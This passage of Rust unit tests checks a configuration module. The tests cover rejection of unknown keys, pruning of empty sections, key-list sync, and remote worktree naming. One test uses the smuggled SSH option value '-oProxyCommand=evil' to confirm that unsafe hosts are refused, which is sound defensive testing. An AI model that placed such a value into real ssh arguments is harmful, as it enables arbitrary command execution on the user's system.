        let e = toml::from_str::<GlobalConfig>("[remote]\nhosst = \"x\"\n")
            .map(|_| ())
            .expect_err("unknown TOML key must be refused");
        assert!(e.to_string().contains("hosst"), "{e}");

        assert!(g.unset("remote.host").unwrap());
        assert!(g.remote.is_none(), "emptied section must be pruned");
        assert_eq!(toml::to_string_pretty(&g).unwrap(), "");
        assert!(!g.unset("remote.host").unwrap());
    }

    #[test]
    fn global_config_rejects_unknown_keys_and_unsafe_hosts() {
        let mut g = GlobalConfig::default();
        for r in [
            g.get("remote.hots").map(|_| ()),
            g.set("no.such.key", "x"),
            g.unset("remote").map(|_| ()),
        ] {
            let e = r.expect_err("unknown key must be refused");
            assert!(e.to_string().contains("known keys"), "{e}");
        }
        // The host lands in ssh argv later — option-shaped values must be refused at set time.
        let e = g.set("remote.host", "-oProxyCommand=evil").expect_err("unsafe host");
        assert!(e.to_string().contains("unsafe SSH host"), "{e}");
    }

    #[test]
    fn global_keys_and_accessor_arms_stay_in_sync() {
        // GLOBAL_KEYS only feeds error text; this walk catches drift against the match arms.
        let mut g = GlobalConfig::default();
        for key in GLOBAL_KEYS {
            g.set(key, "some-value").unwrap_or_else(|e| panic!("set {key}: {e}"));
            assert_eq!(g.get(key).unwrap(), Some("some-value"), "get {key}");
            assert!(g.unset(key).unwrap(), "unset {key}");
            assert_eq!(g.get(key).unwrap(), None, "{key} cleared");
        }
    }

    #[test]
    fn worktree_base_defaults_to_workspace_dir_name() {
        let r = RemoteConfig { connection: "h".into(), workspace_path: None, publish_address: None };
        assert_eq!(r.worktree_base(Path::new("/home/me/myapp")), "myapp");
        let r2 = RemoteConfig { workspace_path: Some("ws/x".into()), ..r };
        assert_eq!(r2.worktree_base(Path::new("/home/me/myapp")), "ws/x");
    }
}
